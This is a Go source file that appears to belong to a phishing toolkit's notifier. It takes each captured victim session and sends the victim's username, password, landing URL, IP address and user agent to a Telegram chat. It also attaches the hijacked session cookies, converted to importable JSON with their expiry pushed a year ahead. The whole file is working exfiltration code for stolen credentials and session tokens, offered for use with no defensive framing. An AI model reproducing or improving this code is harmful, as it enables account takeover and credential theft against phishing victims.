package main

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

type Token struct {
	Name             string      `json:"name"`
	Value            string      `json:"value"`
	Domain           string      `json:"domain"`
	HostOnly         bool        `json:"hostOnly"`
	Path             string      `json:"path"`
	Secure           bool        `json:"secure"`
	HttpOnly         bool        `json:"httpOnly"`
	SameSite         string      `json:"sameSite"`
	Session          bool        `json:"session"`
	FirstPartyDomain string      `json:"firstPartyDomain"`
	PartitionKey     interface{} `json:"partitionKey"`
	ExpirationDate   *int64       `json:"expirationDate,omitempty"`
	StoreID          interface{} `json:"storeId"`
}

func extractTokens(input map[string]map[string]map[string]interface{}) []Token {
	var tokens []Token

	for domain, tokenGroup := range input {
		for _, tokenData := range tokenGroup {
			var t Token

			if name, ok := tokenData["Name"].(string); ok {
				// Remove &
				t.Name = name
			}
			if val, ok := tokenData["Value"].(string); ok {
				t.Value = val
			}
			// Remove leading dot from domain
			if len(domain) > 0 && domain[0] == '.' {
				domain = domain[1:]
			}
			t.Domain = domain

			if hostOnly, ok := tokenData["HostOnly"].(bool); ok {
				t.HostOnly = hostOnly
			}
			if path, ok := tokenData["Path"].(string); ok {
				t.Path = path
			}
			if secure, ok := tokenData["Secure"].(bool); ok {
				t.Secure = secure
			}
			if httpOnly, ok := tokenData["HttpOnly"].(bool); ok {
				t.HttpOnly = httpOnly
			}
			if sameSite, ok := tokenData["SameSite"].(string); ok {
				t.SameSite = sameSite
			}
			if session, ok := tokenData["Session"].(bool); ok {
				t.Session = session
			}
			if fpd, ok := tokenData["FirstPartyDomain"].(string); ok {
				t.FirstPartyDomain = fpd
			}
			if pk, ok := tokenData["PartitionKey"]; ok {
				t.PartitionKey = pk
			}
			
			if storeID, ok := tokenData["storeId"]; ok {
				t.StoreID = storeID
			} else if storeID, ok := tokenData["StoreID"]; ok {
				t.StoreID = storeID
			}

			exp := time.Now().AddDate(1, 0, 0).Unix()
			t.ExpirationDate = &exp

			tokens = append(tokens, t)
		}
	}
	return tokens
}

func processAllTokens(sessionTokens, httpTokens, bodyTokens, customTokens string) ([]Token, error) {
	var consolidatedTokens []Token

	// Parse and extract tokens for each category
	for _, tokenJSON := range []string{sessionTokens, httpTokens, bodyTokens, customTokens} {
		// Skip empty strings or null JSON
		if tokenJSON == "" || tokenJSON == "null" || strings.TrimSpace(tokenJSON) == "null" {
			continue
		}

		var rawTokens map[string]map[string]map[string]interface{}
		if err := json.Unmarshal([]byte(tokenJSON), &rawTokens); err != nil {
			// If unmarshaling fails, skip this token set but continue with others
			fmt.Printf("Warning: error parsing token JSON: %v\n", err)
			continue
		}

		// Only process if rawTokens is not nil and not empty
		if rawTokens != nil && len(rawTokens) > 0 {
			tokens := extractTokens(rawTokens)
			consolidatedTokens = append(consolidatedTokens, tokens...)
		}
	}

	return consolidatedTokens, nil
}

// Define a map to store session IDs and a mutex for thread-safe access
var processedSessions = make(map[string]bool)
var sessionMessageMap = make(map[string]int)
var mu sync.Mutex

func generateRandomString() string {
	rand.Seed(time.Now().UnixNano())
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	length := 10
	randomStr := make([]byte, length)
	for i := range randomStr {
		randomStr[i] = charset[rand.Intn(len(charset))]
	}
	return string(randomStr)
}
func createTxtFile(session Session) (string, error) {
	// Create a random text file name
	txtFileName := generateRandomString() + ".txt"
	txtFilePath := filepath.Join(os.TempDir(), txtFileName)

	// Create a new text file
	txtFile, err := os.Create(txtFilePath)
	if err != nil {
		return "", fmt.Errorf("failed to create text file: %v", err)
	}
	defer txtFile.Close()

	// Initialize nil maps to empty maps to avoid null JSON
	tokens := session.Tokens
	if tokens == nil {
		tokens = make(map[string]interface{})
	}
	httpTokens := session.HTTPTokens
	if httpTokens == nil {
		httpTokens = make(map[string]interface{})
	}
	bodyTokens := session.BodyTokens
	if bodyTokens == nil {
		bodyTokens = make(map[string]interface{})
	}
	custom := session.Custom
	if custom == nil {
		custom = make(map[string]interface{})
	}

	// Marshal the session maps into JSON byte slices
	tokensJSON, err := json.MarshalIndent(tokens, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal Tokens: %v", err)
	}
	httpTokensJSON, err := json.MarshalIndent(httpTokens, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal HTTPTokens: %v", err)
	}
	bodyTokensJSON, err := json.MarshalIndent(bodyTokens, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal BodyTokens: %v", err)
	}
	customJSON, err := json.MarshalIndent(custom, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal Custom: %v", err)
	}

	allTokens, err := processAllTokens(string(tokensJSON), string(httpTokensJSON), string(bodyTokensJSON), string(customJSON))

	result, err := json.MarshalIndent(allTokens, "", "  ")
	if err != nil {
		fmt.Println("Error marshalling final tokens:", err)

	}

	fmt.Println("Combined Tokens: ", string(result))

	// Write the consolidated data into the text file
	_, err = txtFile.WriteString(string(result))
	if err != nil {
		return "", fmt.Errorf("failed to write data to text file: %v", err)
	}

	return txtFilePath, nil
}

func formatSessionMessage(session Session) string {
	// Format the session information (no token data in message)
	return fmt.Sprintf("✨ Session Information ✨\n\n"+

		"👤 Username:      ➖ %s\n"+
		"🔑 Password:      ➖ %s\n"+
		"🌐 Landing URL:   ➖ %s\n \n"+
		"🖥️ User Agent:    ➖ %s\n"+
		"🌍 Remote Address:➖ %s\n"+
		"🕒 Create Time:   ➖ %d\n"+
		"🕔 Update Time:   ➖ %d\n"+
		"\n"+
		"📦 Tokens are added in txt file and attached separately in message.\n",

		session.Username,
		session.Password,
		session.LandingURL,
		session.UserAgent,
		session.RemoteAddr,
		session.CreateTime,
		session.UpdateTime,
	)
}
func Notify(session Session) {
	config, err := loadConfig()
	if err != nil {
		fmt.Println(err)
		return
	}

	sessionKey := fmt.Sprintf("%d", session.ID)
	mu.Lock()
	// Check if the session is already processed
	if processedSessions[sessionKey] {
		mu.Unlock()
		messageID, exists := sessionMessageMap[sessionKey]
		if exists {
			txtFilePath, err := createTxtFile(session)
			if err != nil {
				fmt.Println("Error creating TXT file for update:", err)
				return
			}
			msg_body := formatSessionMessage(session)
			err = editMessageFile(config.TelegramChatID, config.TelegramToken, messageID, txtFilePath, msg_body)
			if err != nil {
				fmt.Printf("Error editing message: %v\n", err)
			}
			os.Remove(txtFilePath)
		} else {
			fmt.Println("Message ID not found for session:", session.ID)
		}
		return
	}

	// Mark session as processed
	processedSessions[sessionKey] = true
	mu.Unlock()

	// Create the TXT file for the original message
	txtFilePath, err := createTxtFile(session)
	if err != nil {
		fmt.Println("Error creating TXT file:", err)
		return
	}

	// Format the message
	message := formatSessionMessage(session)

	// Send the notification and get the message ID
	messageID, err := sendTelegramNotification(config.TelegramChatID, config.TelegramToken, message, txtFilePath)
	if err != nil {
		fmt.Printf("Error sending Telegram notification: %v\n", err)
		os.Remove(txtFilePath)
		return
	}

	// Map the session ID to the message ID
	// sessionKey already declared above, reuse it
	mu.Lock()
	sessionMessageMap[sessionKey] = messageID
	mu.Unlock()

	// Remove the temporary TXT file
	os.Remove(txtFilePath)
}
